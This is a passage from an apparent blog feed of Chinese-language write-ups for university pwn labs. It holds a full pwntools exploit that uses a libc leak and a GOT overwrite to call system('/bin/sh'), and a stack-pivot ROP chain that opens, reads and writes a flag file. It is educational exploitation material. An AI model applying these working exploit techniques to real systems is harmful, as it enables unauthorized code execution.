&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>此時我們可以輸入system的address，經過這三行後我們就成功把puts got address換成system got address&lt;/li>
&lt;li>所有工具都準備好了，接下來只要呼叫puts就可以了，實際上就是呼叫system
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># system(&amp;#39;/bin/sh\x00&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_addr
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_plt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="exploit---ret2pltleak-base-address--got-hijackcall-system">
 Exploit - Ret2Plt(leak base address) + Got Hijack(call system)
 &lt;a class="anchor" href="#exploit---ret2pltleak-base-address--got-hijackcall-system">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./chal&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># r = remote(&amp;#39;10.113.184.121&amp;#39;, 10053)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;/lib/x86_64-linux-gnu/libc.so.6&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#f92672">.&lt;/span>arch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000401263&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_got &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x403368&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_plt &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x401070&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gets_got &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x403378&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gets_plt &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x401090&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_addr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x403f00&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#f92672">=&lt;/span> flat(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># leak puts got address to calculate libc base address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, puts_got,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts_plt,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># fetch user input -&amp;gt; /bin/sh\x00&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, bss_addr,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> gets_plt,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># fetch user input -&amp;gt; system address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, puts_got,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> gets_plt,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># system(&amp;#39;/bin/sh\x00&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, bss_addr,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts_plt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>raw_input()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Try your best :&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span> &lt;span style="color:#f92672">+&lt;/span> payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(r&lt;span style="color:#f92672">.&lt;/span>recvline())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_addr &lt;span style="color:#f92672">=&lt;/span> u64(r&lt;span style="color:#f92672">.&lt;/span>recv(&lt;span style="color:#ae81ff">6&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;puts address = &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>hex(puts_addr)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc_base &lt;span style="color:#f92672">=&lt;/span> puts_addr &lt;span style="color:#f92672">-&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc&lt;span style="color:#f92672">.&lt;/span>address &lt;span style="color:#f92672">=&lt;/span> libc_base
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>system_addr &lt;span style="color:#f92672">=&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;system&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;system address = &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>hex(system_addr)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/bin/sh&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>raw_input()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(p64(libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;system&amp;#39;&lt;/span>]))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Simple PWN 0x35(2023 Lab - Stack Pivot)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x352023-lab---stack-pivot/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x352023-lab---stack-pivot/</guid><description>&lt;h1 id="simple-pwn-0x352023-lab---stack-pivot">
 Simple PWN 0x35(2023 Lab - Stack Pivot)
 &lt;a class="anchor" href="#simple-pwn-0x352023-lab---stack-pivot">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/rylybxgji">Simple PWN - 0x09(stack pivoting)&lt;/a>
&lt;a href="https://hackmd.io/@SBK6401/H1NX6Bloj">Simple PWN - 0x10(seccomp/Lab - rop2win)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, buf, &lt;span style="color:#ae81ff">0x80&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題助教是預設我們必須要使用stack pivot的技巧拿到flag，不過沒有時間設定seccomp，所以我們自己假裝只能使用read / write / open這三個syscall&lt;/p>
&lt;ol>
&lt;li>checksec + file
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ checksec chal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_stack_pivot/share/chal&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Arch: amd64-64-little
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RELRO: Partial RELRO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Stack: Canary found
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> NX: NX enabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ file chal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chal: ELF 64-bit LSB executable, x86-64, version &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">(&lt;/span>GNU/Linux&lt;span style="color:#f92672">)&lt;/span>, statically linked, BuildID&lt;span style="color:#f92672">[&lt;/span>sha1&lt;span style="color:#f92672">]=&lt;/span>26fa8e6daa97baf7a26596ea91af5703dd932327, &lt;span style="color:#66d9ef">for&lt;/span> GNU/Linux 3.2.0, not stripped
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>首先可以看到該binary是statically link，所以直覺是利用ROP chain拿到shell，不過仔細看source code會發現BOF的長度顯然不太夠我們蓋成shell，所以需要用到stack pivot的技巧，控制RBP跳到其他的地方繼續寫&lt;/li>
&lt;li>找gadget
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>leave_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000401cfc&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000401832&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rsi_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x000000000040f01e&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rax_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000448d27&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdx_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x000000000040173f&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>syscall_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000448280&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>這邊的重點是syscall ret這個gadget，其實他不是syscall完之後直接ret，而是在經過一些判斷才會進到ret，這個可以從gdb看出來
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef➤ x/10i 0x448280
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x448280 &amp;lt;read+16&amp;gt;: syscall
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">=&lt;/span>&amp;gt; 0x448282 &amp;lt;read+18&amp;gt;: cmp rax,0xfffffffffffff000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x448288 &amp;lt;read+24&amp;gt;: ja 0x4482e0 &amp;lt;read+112&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x44828a &amp;lt;read+26&amp;gt;: ret
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>會這樣的原因是我們在ROPgadget中找不到&lt;code>syscall ; ret&lt;/code>的gadget，所以助教提示可以直接從read / write這種function找，這樣syscall完了之後會很快的接到ret，這樣中間的操作才不會太影響我們蓋的rop&lt;/li>
&lt;li>Construct ROP
首先，我們的流程是
==main_fn → bss_open → main_fn → bss_open → main_fn → bss_write==
會這樣的原因是我們只能寫入0x60的空間而已，所以把open / read / write分開寫，而寫完且執行完後會再跳原main_fn，這樣才能讓我們再讀取下一段的ROP payload
&lt;ol>
&lt;li>寫入的bss_addr和main_fn address
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>bss_addr_open &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x4c2700&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_addr_read &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x4c2800&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_addr_write &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x4c2900&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>main_fn &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x401ce1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>先讓rbp跳到bss_open，然後ret到main_fn，接要放到bss_open的payload
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>trash_payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">0x20&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(trash_payload &lt;span style="color:#f92672">+&lt;/span> p64(bss_addr_open) &lt;span style="color:#f92672">+&lt;/span> p64(main_fn))
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>之前的rop chain我們會把RBP一起蓋掉，但現在因為要跳到其他的地方，所以rbp的部分就跳到&lt;code>0x4c2700&lt;/code>，然後ret address接main_fn
用gdb跟一下，放完的結果大概是這樣
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>0x00007ffc884f3670│+0x0000: &lt;span style="color:#e6db74">&amp;#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;#34;&lt;/span> ← $rsp, $rsi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffc884f3678│+0x0008: &lt;span style="color:#e6db74">&amp;#34;aaaaaaaaaaaaaaaaaaaaaaaa&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffc884f3680│+0x0010: &lt;span style="color:#e6db74">&amp;#34;aaaaaaaaaaaaaaaa&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffc884f3688│+0x0018: &lt;span style="color:#e6db74">&amp;#34;aaaaaaaa&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffc884f3690│+0x0020: 0x00000000004c2700 → &amp;lt;transmem_list+0&amp;gt; add BYTE PTR &lt;span style="color:#f92672">[&lt;/span>rax&lt;span style="color:#f92672">]&lt;/span>, al ← $rbp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffc884f3698│+0x0028: 0x0000000000401ce1 → &amp;lt;main+12&amp;gt; lea rax, &lt;span style="color:#f92672">[&lt;/span>rbp-0x20&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>當main_fn執行完leave(&lt;code>mov rsp , rbp ; pop rbp ;&lt;/code>)的時候，rbp就會指到==0x4c2700==，當我們ret到main_fn時，就可以再次輸入payload放到0x4c2700&lt;/li>
&lt;li>觀察main_fn的assembly
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef➤ x/10i &amp;amp;main
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cd5 &amp;lt;main&amp;gt;: endbr64
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cd9 &amp;lt;main+4&amp;gt;: push rbp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cda &amp;lt;main+5&amp;gt;: mov rbp,rsp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cdd &amp;lt;main+8&amp;gt;: sub rsp,0x20
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401ce1 &amp;lt;main+12&amp;gt;: lea rax,&lt;span style="color:#f92672">[&lt;/span>rbp-0x20&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401ce5 &amp;lt;main+16&amp;gt;: mov edx,0x80
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cea &amp;lt;main+21&amp;gt;: mov rsi,rax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401ced &amp;lt;main+24&amp;gt;: mov edi,0x0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cf2 &amp;lt;main+29&amp;gt;: call 0x448270 &amp;lt;read&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cf7 &amp;lt;main+34&amp;gt;: mov eax,0x0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>從以上的code可以看得出來，我們是跳到0x401ce1，所以rbp會張出0x20的空間，也就是==0x4c2700-0x20=0x4c26e0==，然後read到的內容就會放到這邊來&lt;/li>
&lt;li>寫入bss_addr_open
我們的目標是達成==fd = open(&amp;quot;/home/chal/flag.txt&amp;quot;, 0);==，具體payload如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>file_addr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/home/chal/flag.txt&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">0x20&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ROP_open &lt;span style="color:#f92672">=&lt;/span> flat(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Open file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># fd = open(&amp;#34;/home/chal/flag.txt&amp;#34;, 0);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bss_addr_read,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rax_ret, &lt;span style="color:#ae81ff">2&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, bss_addr_open &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rsi_ret, &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdx_ret, &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> syscall_ret,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> main_fn
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(file_addr &lt;span style="color:#f92672">+&lt;/span> ROP_open)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>首先原本的0x20就拿來放檔案的位址，不過為甚麼後面還要再接著bss_addr_write呢?就和上面一樣，我們要寫別的rop payload上去，因為原本的位子不夠寫了，所以syscall_ret後接到main_fn，他會讀取我們寫入的rop payload到bss_addr_read的地方&lt;/li>
&lt;li>寫入bss_addr_read
我們要達成的目標是==read(fd, buf, 0x30)==，具體payload如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>ROP_read &lt;span style="color:#f92672">=&lt;/span> flat(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Read the file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># read(fd, buf, 0x30);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bss_addr_write,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rax_ret, &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, &lt;span style="color:#ae81ff">3&lt;/span>, 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rsi_ret, bss_addr_read,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdx_ret, &lt;span style="color:#ae81ff">0x30&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> syscall_ret,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> main_fn
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(file_addr &lt;span style="color:#f92672">+&lt;/span> ROP_read)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>寫入bss_addr_write
我們要達成的目標是==write(fd, buf, 0x30)==，具體payload如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>ROP_write &lt;span style="color:#f92672">=&lt;/span> flat(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Write the file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># write(1, buf, 0x30);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bss_addr_write,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rax_ret, &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rsi_ret, bss_addr_read,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdx_ret, &lt;span style="color:#ae81ff">0x30&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> syscall_ret,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(file_addr &lt;span style="color:#f92672">+&lt;/span> ROP_write)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;p>:::danger
